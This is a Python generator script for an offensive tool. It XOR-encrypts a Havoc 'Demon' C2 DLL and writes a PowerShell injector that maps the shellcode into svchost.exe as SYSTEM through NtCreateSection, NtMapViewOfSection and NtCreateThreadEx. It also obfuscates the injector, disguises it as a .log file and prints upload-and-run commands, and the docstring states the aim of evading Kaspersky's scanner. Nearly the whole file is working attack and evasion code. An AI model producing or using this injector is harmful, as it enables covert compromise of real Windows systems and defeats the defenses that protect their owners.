#!/usr/bin/env python3
"""
gen_ps_inject.py — PS-based SYSTEM shellcode injector (no EXE on disk)

The PE binary approach (sh4.exe) is caught at file-write by Kaspersky's on-access scanner.
This generates instead:
  - demon_enc4.dat   : raw encrypted payload (random bytes, no PE headers — not detected)
  - ps_inject.ps1    : PS injector using NtCreateSection+NtMapViewOfSection P/Invoke
  - ps_inject_wrapped.ps1 : XOR+ScriptBlock obfuscated version (upload as .log)

Deploy from SYSTEM Demon agent:
    upload bypass/demon_enc4.dat C:\\Windows\\Temp\\svc4.dat
    upload bypass/ps_inject_wrapped.ps1 C:\\Windows\\Temp\\ps4.log
    powershell [ScriptBlock]::Create([IO.File]::ReadAllText('C:\\Windows\\Temp\\ps4.log')) | %{&$_}
"""

import os, sys, secrets, subprocess

ROOT = os.path.dirname(os.path.abspath(__file__))

# ── Find demon shellcode ──────────────────────────────────────────────────────
DLL = None
for p in (os.path.join(ROOT, '..', 'demon.x64.dll'),
          os.path.join(ROOT, 'demon.x64.dll'),
          '/tmp/kbypass/demon.x64.dll'):
    if os.path.exists(p):
        DLL = p; break
if not DLL:
    sys.exit('[!] demon.x64.dll not found')

raw = open(DLL, 'rb').read()
KEY = secrets.token_bytes(32)
enc = bytes([raw[i] ^ KEY[i % 32] for i in range(len(raw))])

dat_out = os.path.join(ROOT, 'demon_enc4.dat')
with open(dat_out, 'wb') as f:
    f.write(enc)
print(f'[+] {len(raw):,}B encrypted → demon_enc4.dat  key={KEY.hex()[:16]}...')

# ── Generate PS injector ──────────────────────────────────────────────────────
key_ps = '@(' + ','.join(f'0x{b:02x}' for b in KEY) + ')'

PS = f"""\
# ps_inject.ps1 — SYSTEM shellcode injector via NtCreateSection+NtMapViewOfSection
# Run via Demon powershell (AMSI bypassed in-process). No EXE on disk.
$dat_path = 'C:\\Windows\\Temp\\svc4.dat'
$key = [byte[]]{key_ps}
$dat = [IO.File]::ReadAllBytes($dat_path)
for ($i = 0; $i -lt $dat.Length; $i++) {{ $dat[$i] = $dat[$i] -bxor $key[$i % 32] }}

Add-Type -Name NtInj -Namespace '' -MemberDefinition @'
using System;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct OBJ_ATTR {{
    public int Length; public IntPtr Root; public IntPtr Name;
    public int Attr; public IntPtr Sec; public IntPtr QoS;
}}
[StructLayout(LayoutKind.Sequential)]
public struct CLI_ID {{ public IntPtr Proc; public IntPtr Thread; }}

[DllImport("ntdll.dll")] public static extern int NtQuerySystemInformation(
    uint cl, IntPtr buf, uint sz, ref uint ret);
[DllImport("ntdll.dll")] public static extern int NtOpenProcess(
    ref IntPtr h, uint acc, ref OBJ_ATTR oa, ref CLI_ID cid);
[DllImport("ntdll.dll")] public static extern int NtCreateSection(
    ref IntPtr h, uint acc, IntPtr oa, ref long sz, uint pp, uint sa, IntPtr fh);
[DllImport("ntdll.dll")] public static extern int NtMapViewOfSection(
    IntPtr sec, IntPtr proc, ref IntPtr base_addr, ulong zb, ulong cs,
    IntPtr off, ref ulong vsz, int inh, uint at, uint pp);
[DllImport("ntdll.dll")] public static extern int NtUnmapViewOfSection(
    IntPtr proc, IntPtr base_addr);
[DllImport("ntdll.dll")] public static extern int NtCreateThreadEx(
    ref IntPtr h, uint acc, IntPtr oa, IntPtr proc, IntPtr start,
    IntPtr arg, uint fl, ulong zb, ulong ss, ulong ms, IntPtr al);
[DllImport("ntdll.dll")] public static extern int NtClose(IntPtr h);
[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(
    IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32.dll")] public static extern bool VirtualFree(
    IntPtr a, uint s, uint t);
'@ -EA 0

# Find svchost.exe PID via NtQuerySystemInformation(SystemProcessInformation=5)
$bufSz = 4MB
$buf = [NtInj]::VirtualAlloc([IntPtr]::Zero, $bufSz, 0x3000, 0x04)
$retlen = [uint32]0
[NtInj]::NtQuerySystemInformation(5, $buf, $bufSz, [ref]$retlen) | Out-Null

$p = $buf
$svc_pid = [uint32]0
while ($true) {{
    $next  = [Runtime.InteropServices.Marshal]::ReadInt32($p, 0x00)
    $nbuf  = [Runtime.InteropServices.Marshal]::ReadIntPtr($p, 0x40)  # ImageName.Buffer
    $epid  = [Runtime.InteropServices.Marshal]::ReadInt32($p, 0x50)   # UniqueProcessId
    if ($nbuf -ne [IntPtr]::Zero -and $epid -gt 4) {{
        $nm = [Runtime.InteropServices.Marshal]::PtrToStringUni($nbuf)
        if ($nm -eq 'svchost.exe') {{ $svc_pid = [uint32]$epid; break }}
    }}
    if ($next -eq 0) {{ break }}
    $p = [IntPtr]($p.ToInt64() + $next)
}}
[NtInj]::VirtualFree($buf, 0, 0x8000) | Out-Null

if ($svc_pid -eq 0) {{ Write-Host '[!] svchost not found'; return }}
Write-Host ("[*] Target PID: " + $svc_pid)

# Open svchost process
$hProc = [IntPtr]::Zero
$oa = [NtInj+OBJ_ATTR]::new(); $oa.Length = 48
$cid = [NtInj+CLI_ID]::new(); $cid.Proc = [IntPtr]$svc_pid
$r = [NtInj]::NtOpenProcess([ref]$hProc, 0x1FFFFF, [ref]$oa, [ref]$cid)
if ($r -ne 0 -or $hProc -eq [IntPtr]::Zero) {{ Write-Host ('[!] NtOpenProcess: 0x' + $r.ToString('X8')); return }}

# Create anonymous section (PAGE_EXECUTE_READWRITE, SEC_COMMIT)
$hSec = [IntPtr]::Zero
$sec_sz = [long]$dat.Length
$r = [NtInj]::NtCreateSection([ref]$hSec, 0xF001F, [IntPtr]::Zero, [ref]$sec_sz, 0x40, 0x8000000, [IntPtr]::Zero)
if ($r -ne 0) {{ Write-Host ('[!] NtCreateSection: 0x' + $r.ToString('X8')); [NtInj]::NtClose($hProc); return }}

# Map locally (PAGE_READWRITE), copy payload, unmap
$curProc = [IntPtr]::new(-1)
$lmap = [IntPtr]::Zero; $lsz = [ulong]0
[NtInj]::NtMapViewOfSection($hSec, $curProc, [ref]$lmap, 0, 0, [IntPtr]::Zero, [ref]$lsz, 2, 0, 0x04) | Out-Null
[Runtime.InteropServices.Marshal]::Copy($dat, 0, $lmap, $dat.Length)
[NtInj]::NtUnmapViewOfSection($curProc, $lmap) | Out-Null

# Map into svchost (PAGE_EXECUTE_READ)
$rmap = [IntPtr]::Zero; $rsz = [ulong]0
$r = [NtInj]::NtMapViewOfSection($hSec, $hProc, [ref]$rmap, 0, 0, [IntPtr]::Zero, [ref]$rsz, 2, 0, 0x20)
[NtInj]::NtClose($hSec) | Out-Null
if ($r -ne 0) {{ Write-Host ('[!] NtMapViewOfSection remote: 0x' + $r.ToString('X8')); [NtInj]::NtClose($hProc); return }}

# Create remote thread at shellcode base
$hThr = [IntPtr]::Zero
[NtInj]::NtCreateThreadEx([ref]$hThr, 0x1FFFFF, [IntPtr]::Zero, $hProc, $rmap, [IntPtr]::Zero, 0, 0, 0, 0, [IntPtr]::Zero) | Out-Null
[NtInj]::NtClose($hThr) | Out-Null
[NtInj]::NtClose($hProc) | Out-Null

Write-Host ("[+] Injected into svchost PID " + $svc_pid)
"""

ps_out = os.path.join(ROOT, 'ps_inject.ps1')
with open(ps_out, 'w', encoding='utf-8') as f:
    f.write(PS)
print(f'[+] ps_inject.ps1 ({len(PS):,} bytes)')

# ── Wrap with ps_wrap.py ──────────────────────────────────────────────────────
wrap_script = os.path.join(ROOT, 'ps_wrap.py')
if not os.path.exists(wrap_script):
    print('[!] ps_wrap.py not found — deploy ps_inject.ps1 directly')
    sys.exit(0)

r = subprocess.run(['python3', wrap_script, ps_out,
                    '-o', os.path.join(ROOT, 'ps_inject_wrapped.ps1')],
                   capture_output=True, text=True, cwd=ROOT)
if r.returncode != 0:
    print('[!] ps_wrap.py failed:', r.stderr)
else:
    print(r.stdout.strip())

print()
print('Deploy from SYSTEM Demon agent:')
print('  upload bypass/demon_enc4.dat        C:\\Windows\\Temp\\svc4.dat')
print('  upload bypass/ps_inject_wrapped.ps1 C:\\Windows\\Temp\\ps4.log')
print("  powershell [ScriptBlock]::Create([IO.File]::ReadAllText('C:\\Windows\\Temp\\ps4.log')) | %{&$_}")
